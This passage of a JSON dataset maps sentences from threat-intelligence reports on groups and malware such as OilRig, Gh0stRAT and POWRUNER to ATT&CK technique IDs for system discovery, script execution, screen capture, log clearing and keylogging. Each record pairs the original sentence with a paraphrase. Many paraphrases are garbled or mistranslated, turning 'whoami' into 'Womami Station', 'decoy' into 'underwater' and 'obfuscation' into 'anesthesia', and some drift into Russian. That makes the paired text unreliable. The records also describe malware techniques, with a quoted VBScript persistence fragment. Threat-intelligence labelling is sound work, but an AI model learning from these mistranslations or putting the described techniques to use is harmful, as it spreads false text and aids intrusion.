            "data_text": "An ID command 17 indexes a function that collects system information and sends it to a server C2."
        }
    ],
    "collect usernames": [
        {
            "tec_id": "T1033",
            "en_text": "collect usernames",
            "data_text": "Write down the usernames"
        }
    ],
    "whoami ": [
        {
            "tec_id": "T1033",
            "en_text": "whoami ",
            "data_text": "Womami Station"
        }
    ],
    " query user": [
        {
            "tec_id": "T1033",
            "en_text": " query user",
            "data_text": "query user"
        }
    ],
    "According to the server’s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat": [
        {
            "tec_id": "T1059",
            "en_text": "According to the server’s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat",
            "data_text": "According to the server code, by default, the command it will issue to new infected systems was a batch script contained in a file named 00000000.bats"
        }
    ],
    "Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers": [
        {
            "tec_id": "T1059",
            "en_text": "Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers",
            "data_text": "Compare the code between the standard batch script released by Poison Frog and the batch script received from Helminth Trojan Webshells."
        }
    ],
    "After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents": [
        {
            "tec_id": "T1059",
            "en_text": "After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents",
            "data_text": "After executing malware will use Dropbox API to execute HTTP GET request using HTTPS over TCP port 443 for files: MD5 file name d76261ba3b624933a6ebb5d73758db4 WmiAppCom 79b68cd0044edd4fbf8067b22878644 WmiCompat is used as \"Wmi\" in \"Wmi\".jammed Word malicious documents"
        }
    ],
    "Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros": [
        {
            "tec_id": "T1059",
            "en_text": "Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros",
            "data_text": "Attackers using Comnie use malicious macros that first hide underwater documents and show them when the victim activates the macros"
        }
    ],
    "Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)": [
        {
            "tec_id": "T1059",
            "en_text": "Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)",
            "data_text": "Comnie allows an attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic link library (DLL)"
        }
    ],
    "While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (“.sct” file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info": [
        {
            "tec_id": "T1059",
            "en_text": "While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (“.sct” file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info",
            "data_text": "While all useful files can be dynamically updated, at the time of delivery, this task ran a COM script (file extension \".sct\") that downloaded and ran Metepreter hosted on images.chinabytes[.]info."
        }
    ],
    "VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher": [
        {
            "tec_id": "T1059",
            "en_text": "VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher",
            "data_text": "VBScript #1 Reset Script \"58d2a83f7778d5.36783181.vbs\" acts as a startup"
        }
    ],
    "When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode": [
        {
            "tec_id": "T1059",
            "en_text": "When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode",
            "data_text": "When the first stage of the shellcode receives a special \"FF\" signal, it executes the delivered shellcode"
        }
    ],
    "For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment": [
        {
            "tec_id": "T1059",
            "en_text": "For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment",
            "data_text": "For example, they stated that DROPSHOT uses more state-of-the-art methods to combat emulation, uses external scripts to self-delete, and uses memory inserts to deploy compared to external drivers."
        }
    ],
    "The following are the three files:   Defender.sct – The malicious JavaScript based scriptlet file": [
        {
            "tec_id": "T1059",
            "en_text": "The following are the three files:   Defender.sct – The malicious JavaScript based scriptlet file",
            "data_text": "The following three files Defender.sct – JavaScript-based malicious script file"
        }
    ],
    "Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources": [
        {
            "tec_id": "T1059",
            "en_text": "Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources",
            "data_text": "Users can protect themselves from such attacks by disabling Office macros in their settings, and more carefully when enabling macros (especially when queries occur) in documents, even if such documents are reliable sources."
        }
    ],
    "While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit’s Meterpreter as a potential payload as well": [
        {
            "tec_id": "T1059",
            "en_text": "While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit’s Meterpreter as a potential payload as well",
            "data_text": "Although we were unable to obtain a secondary payload from the Unicorn script created by PowerShell, we believe that this group uses the script to deliver Metaploit MeterPrinter as a potential payload as well."
        }
    ],
    "Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcode injection with native x86 shellcode”": [
        {
            "tec_id": "T1059",
            "en_text": "Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcode injection with native x86 shellcode”",
            "data_text": "In particular, we discovered a code in a PowerShell script that was a match to the code in Magic Unicorn containing a comment \"one line injection shellcode with native x86 shellcode\""
        }
    ],
    "bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server": [
        {
            "tec_id": "T1059",
            "en_text": "bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server",
            "data_text": "bat: COMSysApp service batch configuration file, for x64 system bat: COMSysApp service batch configuration file, for this x86 system — Base64 encoded data file to connect to FTP server"
        }
    ],
    "Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file": [
        {
            "tec_id": "T1059",
            "en_text": "Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file",
            "data_text": "Through WMI (winmgmt), JavaScript code or VBscript in the SCT file generates a PowerShell single-line file that finally consumes the text file."
        }
    ],
    "Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation": [
        {
            "tec_id": "T1059",
            "en_text": "Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER’s DGA implementation",
            "data_text": "Character Description 0 File contains batch commands, it executes batch commands 1 Rename temporary file as extension .ps1 2 Rename temporary file as extension .vbs Table 2: BONDUPDATER Actions Figure 8 - DGA BONDUPDATER implementation screenshot"
        }
    ],
    "To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\\srvResesponded.vbs that contains:CreateObject(“WScript.Shell”).Run(“%app%”) The Trojan replaces the %app% string in the above VBScript with the path to its executable": [
        {
            "tec_id": "T1059",
            "en_text": "To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\\srvResesponded.vbs that contains:CreateObject(“WScript.Shell”).Run(“%app%”) The Trojan replaces the %app% string in the above VBScript with the path to its executable",
            "data_text": "To run persistently on the system, the Trojan will first create a VBScript file: Special Folder.CommonData\\srvResponded.vbs application containing:CreateObject(\"WScript\".Shell\"). Running (\"%app%\") Troyan replaces the string %app% in the above VBScript by going to the executable file"
        }
    ],
    "The group often uses the trial version of Cobalt Strike, a publicly available commercial software for “Adversary Simulations and Red Team Operations.” Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, “a PowerShell and Python post-exploitation agent.” For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap": [
        {
            "tec_id": "T1059",
            "en_text": "The group often uses the trial version of Cobalt Strike, a publicly available commercial software for “Adversary Simulations and Red Team Operations.” Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, “a PowerShell and Python post-exploitation agent.” For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap",
            "data_text": "The group often uses a trial version of Cobalt Strike, a publicly available commercial software for \"Adversary Simulations and Red Team Operations\". Other public tools used by the group are Metaploit, a well-known free and open framework for developing and executing operating code on a remote target machine; Mimikatz, an after-operation tool that performs credential dumps; and Empire, \"Post-User PowerShell and Python.\" CopyKittens uses Havij, Acunetix, and sqlmap to discover and operate Internet servers."
        }
    ],
    "The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode": [
        {
            "tec_id": "T1059",
            "en_text": "The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode",
            "data_text": "The second file is a PowerShell script that appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode"
        }
    ],
    "Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1": [
        {
            "tec_id": "T1059",
            "en_text": "Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1",
            "data_text": "Next, it copies the first stage of the shellcode to memory and creates a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1."
        }
    ],
    "For that we can use a Python script, included in Appendix B – Python Scripts": [
        {
            "tec_id": "T1059",
            "en_text": "For that we can use a Python script, included in Appendix B – Python Scripts",
            "data_text": "To do this, we can use the Python script included in Appendix B – Python scripts"
        }
    ],
    "However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware": [
        {
            "tec_id": "T1059",
            "en_text": "However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware",
            "data_text": "However, to run malware, an attacker uses a batch script that runs malware, but the batch script does more than just initiate malware execution."
        }
    ],
    "The full contents of the batch script are given in Appendix C – a.bat": [
        {
            "tec_id": "T1059",
            "en_text": "The full contents of the batch script are given in Appendix C – a.bat",
            "data_text": "The full contents of the package are given in Appendix C – a.bat"
        }
    ],
    "Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla’s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors": [
        {
            "tec_id": "T1059",
            "en_text": "Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla’s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors",
            "data_text": "Basically, we discuss current activity that revolves around multiple families of malware. Since 2015, Turla has used Javascript, powershell and wsh in a number of ways, including KopiLuwak and IceCoffee scripts. their malware removal/installation operations, as well as full backdoor implementation"
        }
    ],
    "The image is downloaded directly, and the shellcode is loaded and executed in memory": [
        {
            "tec_id": "T1059",
            "en_text": "The image is downloaded directly, and the shellcode is loaded and executed in memory",
            "data_text": "The image is loaded directly, and the shellcode is loaded and executed in memory"
        }
    ],
    "(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar": [
        {
            "tec_id": "T1059",
            "en_text": "(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar",
            "data_text": "(To the left is NavRAT, and to the right is ROKRAT shellcode): We performed the same analysis for the shellcode that is in the downloaded image file, and the shellcode is not exactly the same, but the design is very similar."
        }
    ],
    "Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the “forfiles” utility": [
        {
            "tec_id": "T1059",
            "en_text": "Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the “forfiles” utility",
            "data_text": "Figure 3: Script embedded in 29[.]html, used to download and run Revenge RAT Script shown in Figure 4, is almost identical to what is used by script contents 29[.]html (Figure 3), the only difference is the absence of the sleep command and the use of the \"forfiles\" utility."
        }
    ],
    "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).": [
        {
            "tec_id": "T1059",
            "en_text": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
            "data_text": "The downloaded document template contains malicious macros that run VBScript (VBS)."
        }
    ],
    "The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.": [
        {
            "tec_id": "T1059",
            "en_text": "The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.",
            "data_text": "Attackers typically distribute Netwalker ransomware using a PowerShell reflective script protected from random analysis by multiple layers of anesthesia."
        }
    ],
    "The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.": [
        {
            "tec_id": "T1059",
            "en_text": "The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.",
            "data_text": "Attackers organize attacks using batch or PowerShell scripts that are executed using domain controllers on any machine that DC can come to."
        }
    ],
    "So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.": [
        {
            "tec_id": "T1059",
            "en_text": "So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.",
            "data_text": "Thus, this method uses psexec to copy the loaded load over the network, overwrite earlier versions (if found), and run it without waiting for a response. They use batch files that use psexec , again to pull PowerShell boot scripts to machines that the network scanner finds on the internal network."
        }
    ],
    "The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.": [
        {
            "tec_id": "T1059",
            "en_text": "The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.",
            "data_text": "Files uploaded to this web shell included the same compiled python script that scans remote systems that are vulnerable to CVE-2017-0144 (EternalBlue) that we saw downloaded to another web shell errr.aspx."
        }
    ],
    "Javascript ": [
        {
            "tec_id": "T1059",
            "en_text": "Javascript ",
            "data_text": "JavaScript version of the game"
        }
    ],
    " PowerShell ": [
        {
            "tec_id": "T1059",
            "en_text": " PowerShell ",
            "data_text": "Power Shell"
        }
    ],
    " VBScript ": [
        {
            "tec_id": "T1059",
            "en_text": " VBScript ",
            "data_text": "VBScript"
        }
    ],
    " Python": [
        {
            "tec_id": "T1059",
            "en_text": " Python",
            "data_text": "Python Airport"
        }
    ],
    "Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group": [
        {
            "tec_id": "T1113",
            "en_text": "Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group",
            "data_text": "Data Dump Screenshots include several resource screenshots that Licker claimed were related to the OilRig group"
        }
    ],
    "Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20": [
        {
            "tec_id": "T1113",
            "en_text": "Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four different virtual servers, as seen in Figure 20",
            "data_text": "The screenshot shown in the leak shows the administrative panel for hosting Berbid Server The screenshot shows the control panel of the VPS account on DeltaHost with four different virtual servers, as shown in Figure 20"
        }
    ],
    "Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018": [
        {
            "tec_id": "T1113",
            "en_text": "Screenshot in leak of administrative panel for an account at DeltaHost If we use the filename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018",
            "data_text": "If we use the name of this screenshot and assume that it was made on March 29, 2019 and subtract 194 days from that date, it is possible that this server was launched on at least September 16, 2018."
        }
    ],
    "This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH": [
        {
            "tec_id": "T1113",
            "en_text": "This screenshot is via an RDP session as indicated by the tab located at the top of the screen and is located at 164.132.67[.]216 which is hosted by OVH",
            "data_text": "This screenshot is performed through an RDP session as shown on the tab located at the top of the screen and located at 164.132.67[.]216 , which is hosted by OVH"
        }
    ],
    "The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible": [
        {
            "tec_id": "T1113",
            "en_text": "The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible",
            "data_text": "Malware can turn off keystrokes, screenshots, browser-related data such as cookies and history decrypted whenever possible"
        }
    ],
    "Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands": [
        {
            "tec_id": "T1113",
            "en_text": "Malware features Remexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands",
            "data_text": "Remexi malware features can boast features that allow it to collect keystrokes, take screenshots of interesting windows (as defined in its configuration), steal credentials, logins and browser history, and execute remote commands."
        }
    ],
    "Can capture all screen (“AllScreen”) or the active window (“ActiveWindow”)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration": [
        {
            "tec_id": "T1113",
            "en_text": "Can capture all screen (“AllScreen”) or the active window (“ActiveWindow”)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
            "data_text": "Can capture all screens (\"AllScreen\") or active window (\"ActiveWindow\") -ms the name of the Screenshot file to be saved in the Cache006 subdirectory, pinched with a password from the configuration"
        }
    ],
    "The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences": [
        {
            "tec_id": "T1113",
            "en_text": "The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences",
            "data_text": "The second email refers to the Hong Kong University, which fears that the voices in the referendum for вице-канцлера will be соавторизованы the Beijing-based interests.[9] is shown in Figure 1 : Screenshots of personal images on the activities of the group against financial and political organizations mostly focused on пишках of letters, written in English, intended for the Western audience."
        }
    ],
    "SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path “/FeedBack.php”": [
        {
            "tec_id": "T1113",
            "en_text": "SCREEN Takes a PNG screenshot of the main screen and names the file with timestamps, then uploads it to the C2 server using POST at the path “/FeedBack.php”",
            "data_text": "SCREEN takes a PNG screenshot of the main screen and calls the file time stamps, and then uploads it to the C2 server using POST on the path \"/FeedBack.php\""
        }
    ],
    "While sending to the C2 server, the data is formatted as follows: @{SYSINFO  = $get.ToString(); ACTION = \"REGISTER\";}  Ability to take screenshots": [
        {
            "tec_id": "T1113",
            "en_text": "While sending to the C2 server, the data is formatted as follows: @{SYSINFO  = $get.ToString(); ACTION = \"REGISTER\";}  Ability to take screenshots",
            "data_text": "While the data is C2 server, is formatted as : @ { SYSINFO = $.ToString () ; Asia = \"introduced\" ; } and screen shots."
        }
    ],
    "The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“": [
        {
            "tec_id": "T1113",
            "en_text": "The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“",
            "data_text": "The \"Screenshot\" command accepts the screenshot that is saved as.PNG file in \"Program Base\""
        }
    ],
    "The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path": [
        {
            "tec_id": "T1113",
            "en_text": "The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path",
            "data_text": "The decryption function is displayed on the screen.It is then called by the StartAndPatchRegAsm function.This function tries to find the source executable path of Microsoft RegAsm"
        }
    ],
    "Figure 3: Screen capture of the downloader executed on OS X El Capitan": [
        {
            "tec_id": "T1113",
            "en_text": "Figure 3: Screen capture of the downloader executed on OS X El Capitan",
            "data_text": "Figure 3: Capturing the Downloader Screen Performed on the OS X El Capitan"
        }
    ],
    "Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers": [
        {
            "tec_id": "T1113",
            "en_text": "Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers",
            "data_text": "Interestingly, we have seen recent samples inserting underwater documents that are screenshots of botnet C"
        }
    ],
    "The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system": [
        {
            "tec_id": "T1113",
            "en_text": "The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system",
            "data_text": "The C2 server can also send a PowerShell command to capture and store a screenshot of the victim's system"
        }
    ],
    "POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued": [
        {
            "tec_id": "T1113",
            "en_text": "POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued",
            "data_text": "POWRUNER will send the captured image file to the C2 server if the file-download command is issued."
        }
    ],
    "The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string ‘$screenshot’": [
        {
            "tec_id": "T1113",
            "en_text": "The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string ‘$screenshot’",
            "data_text": "The management command looks for the following command lines in Table 3: $fileDownload Command Description Uploads the contents of the specified file to C2 $importModule Adds the specified PowerShell module to the current $screenshot script Executes the contents of the command, which should be the string '$screenshot'"
        }
    ],
    "23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2": [
        {
            "tec_id": "T1113",
            "en_text": "23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2",
            "data_text": "23 Screen shot, temporarily store it as TPX499.dat, and upload it to C2"
        }
    ],
    "Periodic low resolution screenshots": [
        {
            "tec_id": "T1113",
            "en_text": "Periodic low resolution screenshots",
            "data_text": "Low resolution periodic screenshots"
        }
    ],
    "SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware": [
        {
            "tec_id": "T1113",
            "en_text": "SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware",
            "data_text": "SpyNote RAT has for the devices with audio from the use of functions MediaProjectionCallback (available with Lollipop, Android, the company's enterprise and more) and kept in the \"video.mp4\", as shown in the following screen shot this : Figure 5 : Vacation, decorating my SpyNote RAT, also has been stealing SMS messages with the affected devices, as shown in the picture below, Ri.box 6: Reading SMS messages Contact theft The ability to steal contacts is a favorite feature for spyware developers, as stolen contacts can be used to further distribute spyware"
        }
    ],
    "[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future": [
        {
            "tec_id": "T1113",
            "en_text": "[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future",
            "data_text": "In addition to a standard malware analysis blog article, I would also like to take this time to document and describe my methods for analysis, in the hope that you, as a reader, will use these methods in the future"
        }
    ],
    "Returns the screenshot to the C2 via: <img src=’data:image/jpeg;base64,[base64 of screenshot]’ width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)": [
        {
            "tec_id": "T1113",
            "en_text": "Returns the screenshot to the C2 via: <img src=’data:image/jpeg;base64,[base64 of screenshot]’ width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)",
            "data_text": "Returns the screenshot to C2 via: <img src='data:image/jpeg;base64,[base64 screenshot]' width=800 height=500 /><br> 111 startTakeScreenShot Creates a stream to take a screenshot at a specified interval (default: every 10 seconds)"
        }
    ],
    "capture screenshot": [
        {
            "tec_id": "T1113",
            "en_text": "capture screenshot",
            "data_text": "capture screenshot"
        }
    ],
    "It also deletes Windows Event Logs : Application, Security, Setup, System": [
        {
            "tec_id": "T1070",
            "en_text": "It also deletes Windows Event Logs : Application, Security, Setup, System",
            "data_text": "It also deletes Windows Event Logs : Application, Security, Installation, System"
        }
    ],
    "This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine": [
        {
            "tec_id": "T1070",
            "en_text": "This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine",
            "data_text": "This simply acts as a cleanup to ensure that the original archival artifacts no longer reside on the infected machine."
        }
    ],
    "This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants.  As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs": [
        {
            "tec_id": "T1070",
            "en_text": "This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants.  As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs",
            "data_text": "It is the guest post of independent security researcher James Quinn. This will be part 1 of the series called Reversing Gh0stRAT Variants. As 2018 came to an end and 2019 took over, I began to see different behavior from the authors of SMB Malaysian programs. Instead of massive multi-stage cryptocurrency miners, I began to see smaller, hidden RATs serving as partial stage1. Of these samples, there was one particular sample that stood out to me. This example not only changed the Gh0stRAT header from \"Gh0st\" to \"nbLGX\", but also concealed its traffic with an encryption algorithm across the TCP segment, in addition to standard Zlib compression on the Gh0stRAT data. Below are some key features: Can download more malware Offline Keylogger Cleans Event Logs"
        }
    ],
    "The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used": [
        {
            "tec_id": "T1056",
            "en_text": "The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used",
            "data_text": "The same situation applies to key pair authentication – the server contains a predefined permanent public key and allows authentication only when a particular private key is used."
        }
    ],
    "As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister": [
        {
            "tec_id": "T1056",
